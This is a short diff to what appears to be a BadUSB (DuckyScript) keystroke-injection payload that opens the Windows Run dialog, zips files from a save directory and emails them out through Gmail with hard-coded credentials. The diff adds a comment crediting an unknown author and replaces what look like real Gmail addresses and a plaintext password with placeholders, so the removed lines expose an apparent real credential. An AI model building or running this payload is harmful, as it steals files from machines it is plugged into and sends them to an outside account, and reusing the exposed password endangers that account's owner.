@@ -1,3 +1,4 @@
+REM don't remember who made this Script but here it is Props to them hope it works 
 DELAY 750
 GUI r
 DELAY 1000
@@ -66,11 +67,11 @@ STRING copy-ToZip($fileSaveDir)
 ENTER
 STRING try {
 ENTER
-STRING $Sender = 'demonkodi@gmail.com'
+STRING $Sender = 'sender@gmail.com'
 ENTER
-STRING $Recipient = 'demoniokodi@gmail.com'
+STRING $Recipient = 'recipient@gmail.com'
 ENTER
-STRING $pass = ConvertTo-SecureString 'Ardilla1' -AsPlainText -Force
+STRING $pass = ConvertTo-SecureString 'Password' -AsPlainText -Force
 ENTER
 STRING $creds = New-Object System.Management.Automation.PSCredential($sender.Split("@")[0], $pass)
 ENTER
